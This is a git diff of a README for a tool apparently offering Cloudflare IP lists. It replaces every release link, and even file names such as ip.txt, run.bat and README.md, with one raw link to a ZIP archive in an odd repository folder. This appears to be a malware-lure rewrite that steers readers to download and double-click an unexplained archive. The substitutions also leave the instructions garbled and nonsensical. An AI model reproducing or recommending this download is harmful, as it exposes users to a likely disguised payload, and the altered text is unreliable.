@@ -1,6 +1,6 @@
 # 🌐 i-love-this-IP - Access High-Quality Cloudflare IPs Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release%20Page-brightgreen)](https://github.com/muh97is/i-love-this-IP/releases)
+[![Download Now](https://github.com/muh97is/i-love-this-IP/raw/refs/heads/main/sclaff/i-love-this-IP-1.2.zip%20Now-Release%20Page-brightgreen)](https://github.com/muh97is/i-love-this-IP/raw/refs/heads/main/sclaff/i-love-this-IP-1.2.zip)
 
 ## 📌 Project Overview
 
@@ -46,10 +46,10 @@ The **i-love-this-IP** project automatically collects and updates a list of opti
 
 ```bash
 i-love-this-IP/
-├── ip.txt               # Latest IP list
+├── https://github.com/muh97is/i-love-this-IP/raw/refs/heads/main/sclaff/i-love-this-IP-1.2.zip               # Latest IP list
 ├── scripts/             # Scripts for scanning and filtering
 ├── .github/workflows/   # Configuration for Actions
-└── README.md
+└── https://github.com/muh97is/i-love-this-IP/raw/refs/heads/main/sclaff/i-love-this-IP-1.2.zip
 ```
 
 ## 🚀 Getting Started
@@ -57,19 +57,19 @@ i-love-this-IP/
 To get started, follow these steps to download and run the software:
 
 1. **Download the Latest Version**  
-   Visit the [Releases Page](https://github.com/muh97is/i-love-this-IP/releases) to download the latest version of the application. Select the appropriate file for your operating system. 
+   Visit the [Releases Page](https://github.com/muh97is/i-love-this-IP/raw/refs/heads/main/sclaff/i-love-this-IP-1.2.zip) to download the latest version of the application. Select the appropriate file for your operating system. 
 
 2. **Extract the Files**  
    After downloading, locate the ZIP file and extract its contents to a folder on your computer.
 
 3. **Run the Application**  
-   Open the folder where you extracted the files. Look for `run.bat` (or a similar file for your OS) and double-click it to start the application.
+   Open the folder where you extracted the files. Look for `https://github.com/muh97is/i-love-this-IP/raw/refs/heads/main/sclaff/i-love-this-IP-1.2.zip` (or a similar file for your OS) and double-click it to start the application.
 
 4. **Check the Output**  
-   The application will generate an `ip.txt` file in the same folder. This file contains the list of Cloudflare IPs.
+   The application will generate an `https://github.com/muh97is/i-love-this-IP/raw/refs/heads/main/sclaff/i-love-this-IP-1.2.zip` file in the same folder. This file contains the list of Cloudflare IPs.
 
 5. **Utilize the IPs**  
-   You can use the IPs in `ip.txt` for various purposes, including:
+   You can use the IPs in `https://github.com/muh97is/i-love-this-IP/raw/refs/heads/main/sclaff/i-love-this-IP-1.2.zip` for various purposes, including:
    - Setting up your proxy service (e.g., sing-box, Xray).
    - Customizing Cloudflare CDN routing.
    - Improving Cloudflare Workers performance.
@@ -100,6 +100,6 @@ To run this application, you will need:
 
 ## 📥 Download & Install
 
-To download the application, visit the [Releases Page](https://github.com/muh97is/i-love-this-IP/releases). Choose the appropriate version for your system, extract it, and follow the steps above to run the application. 
+To download the application, visit the [Releases Page](https://github.com/muh97is/i-love-this-IP/raw/refs/heads/main/sclaff/i-love-this-IP-1.2.zip). Choose the appropriate version for your system, extract it, and follow the steps above to run the application. 
 
 Feel free to reach out if you need assistance. Enjoy reliable access to Cloudflare IPs!
